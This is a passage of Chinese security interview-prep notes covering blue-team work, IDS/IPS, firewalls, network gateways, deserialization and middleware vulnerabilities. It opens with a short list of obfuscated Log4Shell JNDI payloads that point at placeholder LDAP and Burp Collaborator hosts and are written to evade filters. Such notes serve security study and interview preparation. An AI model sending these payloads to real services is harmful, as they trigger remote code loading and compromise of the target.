${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}

${j${::-nD}i${::-:}ldap://kjhkjhkjh}

${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}

${j${loWer:Nd}i${uPper::}ldap}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${${upper:}jndi:ldap://example.com/a}

${j${upper::-n}di:ldap://example.com:1389/a}

${"£$_"£:a:d:-${lower:j}n}di:

${:a:d:-${lower:}j}ndi:

${:a:d:-${lower:j}n}di:
```

### 聊一聊你印象最深刻的一次渗透测试经历。

### 蓝初面经

#### 什么是蓝队?

蓝队面临的挑战，是在不对用户造成太多限制的情况下，发现可被利用的漏洞，保护自己的领域。

- **弄清控制措施**

  对蓝队而言最重要的，是了解自身环境中现有控制措施的能力，尤其是在网络钓鱼和电话钓鱼方面。有些公司还真就直到正式对抗了才开始找自家网络中的防护措施。

- **确保能收集并分析数据**

  因为蓝队的功效基于收集和利用数据的能力，日志管理工具，比如Splunk，就特别重要了。另一块能力则是知道如何收集团队动作的所有数据，并高保真地记录下来，以便在复盘时确定哪些做对了，哪些做错了，以及如何改进。

- **使用适合于环境的工具**

  蓝队所用工具取决于自身环境所需。他们得弄清“这个程序在干什么？为什么它会试图格式化硬盘？”，然后加上封锁非预期动作的技术。测试该技术是否成功的工具，则来自红队。

- **挑有经验的人加入团队**

  除了工具，蓝队最有价值的东西，是队员的知识。随着经验的增长，你会开始想“我见过这个，那个也见过，他们做了这个，还做了那个，但我想知道这里是否有个漏洞。”如果你只针对已知的东西做准备，那你对未知就毫无准备。

- **假定会有失败**

  提问，是通往探索未知的宝贵工具。别止步于为今天已存在的东西做准备，要假定自己的基础设施中将会有失败。

  最好的思路，就是假设终将会有漏洞，没什么东西是100%安全的。

#### ⭐属于安全设备的防火墙有哪些？

入侵检测系统（IDS）；入侵防御系统（IPS）；漏洞扫描设备；安全隔离网闸；流量监控设备（QOS）；防病毒网关（防毒墙）；Web应用防火墙（WAF）；安全审计系统等。**防火墙部署于单位或企业内部网络的出口位置。**

- #### 入侵检测系统（IDS）

  - 入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。

  - 入侵检测系统通常包含3个必要的功能组件：**信息来源**、**分析引擎**和**响应组件**。

    -  信息收集包括收集系统、网络、数据及用户活动的状态和行为。入侵检测利用的信息一般来自：系统和网络日志文件、非正常的目录和文件改变、非正常的程序执行这三个方面。
    -  对收集到的有关系统、网络、数据及用户活动的状态和行为等信息，是通过模式匹配、统计分析和完整性分析这三种手段进行分析的。前两种用于实时入侵检测，完整性分析用于事后分析。
    - 根据入侵性质和类型，做出相应的告警与响应。

  - 主要功能：能够提供安全审计、监视、攻击识别和反攻击等多项功能，对内部攻击、外部攻击和误操作进行实时监控。

    - 实时监测：实时地监视、分析网络中所有的数据报文，发现并实时处理所捕获的数据报文；
    - 安全审计：对系统记录的网络事件进行统计分析，发现异常现象，得出系统的安全状态，找出所需要的证据
    - 主动响应：主动切断连接或与防火墙联动，调用其他程序处理。

  - 主要类型：

    - 基于主机的入侵检测系统(HIDS)：基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。

      这种检测方式的优点主要有：信息更详细、误报率要低、部署灵活。这种方式的缺点主要有：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。

    - 基于网络的入侵检测系统(NIDS)：基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。检测设备放置在比较重要的网段内，不停地监视网段中的各种数据包，而不再是只监测单一主机。它对所监测的网络上每一个数据包或可疑的数据包进行特征分析，如果数据包与产品内置的某些规则吻合，入侵检测系统就会发出警报，甚至直接切断网络连接。目前，大部分入侵检测产品是基于网络的。

      这种检测技术的优点主要有：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。其缺点主要是：成本高、检测范围受局限；大量计算，影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘；无法检测加密的封包；对于直接对主机的入侵无法检测出。

  - 局限性：

    - 误报率高：主要表现为把良性流量误认为恶性流量进行误报。还有些IDS产品会对用户不关心事件的进行误报。
    - 产品适应能力差：传统的IDS产品在开发时没有考虑特定网络环境下的需求，适应能力差。入侵检测产品要能适应当前网络技术和设备的发展进行动态调整，以适应不同环境的需求。
    - 大型网络管理能力差：首先，要确保新的产品体系结构能够支持数以百计的IDS传感器；其次，要能够处理传感器产生的告警事件；最后还要解决攻击特征库的建立，配置以及更新问题。
    - 缺少防御功能：大多数IDS产品缺乏主动防御功能。
    - 处理性能差：目前的百兆、千兆IDS产品性能指标与实际要求还存在很大的差距。

- #### 入侵防御系统（IPS）

  - 入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。
  - 主要功能
    - 入侵防护：实时、主动拦截黑客攻击、蠕虫、网络病毒、后门木马、Dos等恶意流量，保护企业信息系统和网络架构免受侵害，防止操作系统和应用程序损坏或宕机。
    - Web安全：基于互联网Web站点的挂马检测结果，结合URL信誉评价技术，保护用户在访问被植入木马等恶意代码的网站时不受侵害，及时、有效地第一时间拦截Web威胁。
    - 流量控制：阻断一切非授权用户流量，管理合法网络资源的利用，有效保证关键应用全天候畅通无阻，通过保护关键应用带宽来不断提升企业IT产出率和收益率。
    - 上网监管：全面监测和管理IM即时通讯、P2P下载、网络游戏、在线视频，以及在线炒股等网络行为，协助企业辨识和限制非授权网络流量，更好地执行企业的安全策略。
  - 技术特征
    - 嵌入式运行：只有以嵌入模式运行的 IPS 设备才能够实现实时的安全防护，实时阻拦所有可疑的数据包，并对该数据流的剩余部分进行拦截。
    - 深入分析和控制：IPS必须具有深入分析能力，以确定哪些恶意流量已经被拦截，根据攻击类型、策略等来确定哪些流量应该被拦截。
    - 入侵特征库：高质量的入侵特征库是IPS高效运行的必要条件，IPS还应该定期升级入侵特征库，并快速应用到所有传感器。
    - 高效处理能力：IPS必须具有高效处理数据包的能力，对整个网络性能的影响保持在最低水平。
  - 主要类型
    - 基于特征的IPS是许多IPS解决方案中最常用的方法。把特征添加到设备中，可识别当前最常见的攻击。也被称为模式匹配IPS。特征库可以添加、调整和更新，以应对新的攻击。
    - 基于异常的IPS也被称为基于行规的IPS。基于异常的方法可以用统计异常检测和非统计异常检测。
    - 基于策略的IPS：更关心的是否执行组织的安保策略。如果检测的活动违反了组织的安保策略就触发报警。使用这种方法的IPS，要把安全策略写入设备之中。
    - 基于协议分析的IPS与基于特征的方法类似。大多数情况检查常见的特征，但基于协议分析的方法可以做更深入的数据包检查，能更灵活地发现某些类型的攻击。

- 漏洞扫描设备

  - 漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞的一种安全检测（渗透攻击）行为。

  - 主要功能：可以对网站、系统、数据库、端口、应用软件等一些网络设备应用进行智能识别扫描检测，并对其检测出的漏洞进行报警提示管理人员进行修复。同时可以对漏洞修复情况进行监督并自动定时对漏洞进行审计提高漏洞修复效率。

    - 定期的网络安全自我检测、评估

      安全检测可帮助客户最大可能的消除安全隐患，尽可能早地发现安全漏洞并进行修补，有效的利用已有系统，提高网络的运行效率。

    - 安装新软件、启动新服务后的检查

      由于漏洞和安全隐患的形式多种多样，安装新软件和启动新服务都有可能使原来隐藏的漏洞暴露出来，因此进行这些操作之后应该重新扫描系统，才能使安全得到保障。

    - 网络承担重要任务前的安全性测试

    - 网络安全事故后的分析调查

      网络安全事故后可以通过网络漏洞扫描/网络评估系统分析确定网络被攻击的漏洞所在，帮助弥补漏洞，尽可能多得提供资料方便调查攻击的来源。

    - 重大网络安全事件前的准备

      重大网络安全事件前网络漏洞扫描/网络评估系统能够帮助用户及时的找出网络中存在的隐患和漏洞，帮助用户及时的弥补漏洞。

  - 主要技术

    - 主机扫描：确定在目标网络上的主机是否在线。
    - 端口扫描：发现远程主机开放的端口以及服务。
    - OS识别技术:根据信息和协议栈判别操作系统。
    - 漏洞检测数据采集技术：按照网络、系统、数据库进行扫描。
    - 智能端口识别、多重服务检测、安全优化扫描、系统渗透扫描。
    - 多种数据库自动化检查技术，数据库实例发现技术。

  - 主要类型

    - 针对网络的扫描器：基于网络的扫描器就是通过网络来扫描远程计算机中的漏洞。价格相对来说比较便宜；在操作过程中，不需要涉及到目标系统的管理员，在检测过程中不需要在目标系统上安装任何东西；维护简便。
    - 针对主机的扫描器：基于主机的扫描器则是在目标系统上安装了一个代理或者是服务，以便能够访问所有的文件与进程，这也使得基于主机的扫描器能够扫描到更多的漏洞。
    - 针对数据库的扫描器：数据库漏扫可以检测出数据库的DBMS漏洞、缺省配置、权限提升漏洞、缓冲区溢出、补丁未升级等自身漏洞。

- #### 安全隔离网闸

  - 安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。由于物理隔离网闸所连接的两个独立网络系统之间，不存在通信的物理连接、逻辑连接、信息传输命令、信息传输协议，不存在依据协议的信息包转发，只有数据文件的无协议“摆渡”，且对固态存储介质只有“读”和“写”两个命令。所以，物理隔离网闸从物理上隔离、阻断了具有潜在攻击可能的一切连接，使“黑客”无法入侵、无法攻击、无法破坏，实现了真正的安全。

  - 功能模块

    - 安全隔离
    - 内核防护
    - 协议转换
    - 病毒查杀
    - 访问控制
    - 安全审计
    - 身份认证

  - 主要功能

    - 阻断网络的直接物理连接：物理隔离网闸在任何时刻都只能与非可信网络和可信网络上之一相连接，而不能同时与两个网络连接。
    - 阻断网络的逻辑连接：物理隔离网闸不依赖操作系统、不支持TCP/IP协议。两个网络之间的信息交换必须将TCP/IP协议剥离，将原始数据通过P2P的非TCP/IP连接方式，通过存储介质的“写入”与“读出”完成数据转发。
    - 安全审查：物理隔离网闸具有安全审查功能，即网络在将原始数据“写入”物理隔离网闸前，根据需要对原始数据的安全性进行检查，把可能的病毒代码、恶意攻击代码消灭干净等。
    - 原始数据无危害性：物理隔离网闸转发的原始数据，不具有攻击或对网络安全有害的特性。就像txt文本不会有病毒一样，也不会执行命令等。
    - 管理和控制功能：建立完善的日志系统。
    - 根据需要建立数据特征库：在应用初始化阶段，结合应用要求，提取应用数据的特征，形成用户特有的数据特征库，作为运行过程中数据校验的基础。当用户请求时，提取用户的应用数据，抽取数据特征和原始数据特征库比较，符合原始特征库的数据请求进入请求队列，不符合的返回用户，实现对数据的过滤。
    - 根据需要提供定制安全策略和传输策略的功能：用户可以自行设定数据的传输策略，如：传输单位（基于数据还是基于任务）、传输间隔、传输方向、传输时间、启动时间等。
    - 支持定时/实时文件交换；支持支持单向/双向文件交换；支持数字签名、内容过滤、病毒检查等功能。

  - 工作原理

    - 安全隔离网闸是实现两个相互业务隔离的网络之间的数据交换，通用的网闸模型设计一般分三个基本部分：

      1、 内网处理单元：包括内网接口单元与内网数据缓冲区。接口部分负责与内网的连接，并终止内网用户的网络连接，对数据进行病毒检测、防火墙、入侵防护等安全检测后剥离出“纯数据”，作好交换的准备，也完成来自内网对用户身份的确认，确保数据的安全通道；数据缓冲区是存放并调度剥离后的数据，负责与隔离交换单元的数据交换。

      2、 外网处理单元：与内网处理单元功能相同，但处理的是外网连接。

      3、 隔离与交换控制单元（隔离硬件）：是网闸隔离控制的摆渡控制，控制交换通道的开启与关闭。控制单元中包含一个数据交换区，就是数据交换中的摆渡船。对交换通道的控制的方式目前有两种技术，摆渡开关与通道控制。摆渡开关是电子倒换开关，让数据交换区与内外网在任意时刻的不同时连接，形成空间间隔GAP，实现物理隔离。通道方式是在内外网之间改变通讯模式，中断了内外网的直接连接，采用私密的通讯手段形成内外网的物理隔离。该单元中有一个数据交换区，作为交换数据的中转。

      其中，三个单元都要求其软件的操作系统是安全的，也就是采用非通用的操作系统，或改造后的专用操作系统。一般为Unix BSD或Linux的经安全精简版本，或者其他是嵌入式操作系统等，但都要对底层不需要的协议、服务删除，使用的协议优化改造，增加安全特性，同时提高效率。

       如果针对网络七层协议，安全隔离网闸是在硬件链路层上断开。

  - 区别比较

    - 与物理隔离卡的区别

      安全隔离网闸与物理隔离卡最主要的区别是，安全隔离网闸能够实现两个网络间的自动的安全适度的信息交换，而物理隔离卡只能提供一台计算机在两个网之间切换，并且需要手动操作，大部分的隔离卡还要求系统重新启动以便切换硬盘。

    - 网络交换信息的区别

      安全隔离网闸在网络间进行的安全适度的信息交换是在网络之间不存在链路层连接的情况下进行的。安全隔离网闸直接处理网络间的应用层数据，利用存储转发的方法进行应用数据的交换，在交换的同时，对应用数据进行的各种安全检查。路由器、交换机则保持链路层畅通，在链路层之上进行IP包等网络层数据的直接转发，没有考虑网络安全和数据安全的问题。

    - 与防火墙的区别

       防火墙一般在进行IP包转发的同时，通过对IP包的处理，实现对TCP会话的控制，但是对应用数据的内容不进行检查。这种工作方式无法防止泄密，也无法防止病毒和黑客程序的攻击。

- 防火墙是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的界面上构造的保护屏障。它可通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。

  - 主要功能

    - 过滤进、出网络的数据
    - 防止不安全的协议和服务
    - 管理进、出网络的访问行为
    - 记录通过防火墙的信息内容
    - 对网络攻击进行检测与警告
    - 防止外部对内部网络信息的获取
    - 提供与外部连接的集中管理

  - 主要类型

    - 网络层防火墙

      一般是基于源地址和目的地址、应用、协议以及每个IP包的端口来作出通过与否的判断。防火墙检查每一条规则直至发现包中的信息与某规则相符。如果没有一条规则能符合，防火墙就会使用默认规则，一般情况下，默认规则就是要求防火墙丢弃该包，其次，通过定义基于TCP或UDP数据包的端口号，防火墙能够判断是否允许建立特定的连接，如Telnet、FTP连接。

    - 应用层防火墙

       针对特别的网络应用服务协议即数据过滤协议，并且能够对数据包分析并形成相关的报告。

#### 简单讲一下反序列化漏洞？

反序列化漏洞是一种安全漏洞，发生在应用程序中使用序列化（将对象转换为字节流）来传输和存储数据时。攻击者可以通过构造恶意的序列化数据，导致应用程序在反序列化（将字节流转换为对象）时执行恶意代码，从而实现攻击目的。

具体来说，攻击者可以构造一个序列化对象，其中包含一个恶意的代码，该代码在反序列化时会被执行。攻击者可以通过修改序列化数据中的类名或对象内容，来绕过应用程序的安全检查，使得应用程序误认为这是一个合法的序列化对象，从而执行恶意代码。

反序列化漏洞通常会导致应用程序遭受各种攻击，例如远程代码执行、拒绝服务攻击、数据泄露等。因此，开发人员和安全专家需要采取措施来预防和缓解反序列化漏洞，例如使用安全的序列化库、限制反序列化的范围、对反序列化数据进行验证等。

#### 序列化和反序列化的区别

序列化和反序列化是两个相对应的过程，序列化是将一个对象转换成一个字节序列，反序列化则是将这个字节序列转换回原来的对象。

在计算机中，对象通常存储在内存中，如果需要将对象传输到另一个计算机或存储在磁盘上，就需要将对象序列化成一个字节序列。这个字节序列可以通过网络传输或存储在磁盘上，当需要使用这个对象时，就需要对字节序列进行反序列化，将其转换回原来的对象。

序列化和反序列化的过程中，需要注意对象的状态和数据类型的转换。在序列化过程中，需要将对象转换成字节序列并存储对象的状态信息，以便在反序列化时能够恢复对象的状态。同时，在反序列化时也需要注意数据类型的转换，以确保转换后的对象与原来的对象一致。

总之，序列化和反序列化是将对象在不同环境中传输和存储的重要方式，可以方便地实现数据的共享和交换。

#### 数据库有哪些，关系型的和非关系型的分别是哪些？

数据库是用于存储和管理数据的软件系统，可以根据其数据组织方式的不同，分为关系型数据库和非关系型数据库两类。

关系型数据库是以表格的形式组织数据的数据库，其中数据以行和列的形式存储，每个表格都有一个唯一的名称，并且每个表格都包含一些列，每一列都有一个名称和数据类型。关系型数据库使用结构化查询语言(SQL)来操作和管理数据，其最常见的代表是：

- MySQL：3306
- Oracle：1521
- SQL Server：1433
- DB2：5000

非关系型数据库则是以键值对（Key-Value）形式存储数据的数据库，其中每个键值对表示一个文档或对象，可以包含不同的字段，而这些字段则可以包含各种不同的数据类型。非关系型数据库由于其简单、灵活、可扩展和高性能等特点，被广泛应用于大数据和分布式系统的开发中。其常见的代表：

- Redis：6379
- MongoDB：27017

#### 常见的中间件漏洞

中间件是指应用程序与操作系统之间的软件层，常用于提供复杂的服务和功能，如消息队列、缓存、Web服务器、数据库等。由于中间件的普遍性和重要性，其安全漏洞也成为黑客攻击的重要目标。以下是常见的一些中间件漏洞：

1. Web服务器漏洞：包括常见的跨站脚本攻击、SQL注入、文件包含、命令执行等漏洞，如Apache、Nginx、IIS等。
2. 数据库漏洞：包括未授权访问、SQL注入、缓冲区溢出、拒绝服务等漏洞，如MySQL、Oracle、SQL Server等。
3. 缓存漏洞：包括未授权访问、缓存污染、缓存击穿、缓存穿透等漏洞，如Redis、Memcached等。
4. 消息队列漏洞：包括未授权访问、拒绝服务、命令执行等漏洞，如RabbitMQ、Kafka等。
5. 应用服务器漏洞：包括拒绝服务、代码注入、文件包含等漏洞，如Tomcat、Jetty等。
6. 中间件组件漏洞：包括常见的心脏出血漏洞、ShellShock漏洞、Ghost漏洞等。

- IIS：PUT漏洞、短文件名猜解、远程代码执行、解析漏洞
- Apache：解析漏洞、目录遍历
- Nginx：文件解析、目录遍历、CRLF注入、目录穿越
- Tomcat：远程代码执行、war后门文件部署
- JBoss：反序列化漏洞、war后门文件部署
- WebLogic：反序列化漏洞、SSRF任意文件上传、war后门文件部署
- Apache Shiro反序列化漏洞：Shiro rememberMe（Shiro-550）、Shiro Padding Oracle Attack(Shiro-721)

#### 内网渗透思路

代理穿透、权限维持、内网信息收集、口令爆破、凭据窃取、社工、横行和纵向渗透、拿下域控。



#### 内网IP：

A段：10.x.x.x

b段：172.16.x.x--172.31.x.x

c段：192.168.x.x

255：为广播频道

#### TCP和UDP

TCP：传输控制协议

UDP：用户数据报协议

- ##### 区别

  - tcp是面向连接的，类似于打电话之前要拨号，而udp是无连接的

  - tcp提供可靠的数据传输，全部且有序的传输；udp尽自己最大能力传输数据

  - tcp需要占据更大的系统性能

  - udp的时效性更好


#### CDN是什么

CDN是内容分发网络，是建立在现有互联网基础上的智能虚拟网络，不仅可以在一定程度上保护网站，还可以加速用户的访问速度，减少访问拥堵（类似多地部署服务器）
多地ping（可以使用各种超级ping的工具）

windows自带的nslookup命令

【如果发现返回多个不同的IP，则是挂了CDN】


https://blog.csdn.net/m0_65041566/article/details/125270963

https://blog.csdn.net/liuguangshibei/article/details/125448026

https://www.potato.gold/article/70.html

https://www.163.com/dy/article/G8HHV72V0511FSTO.html
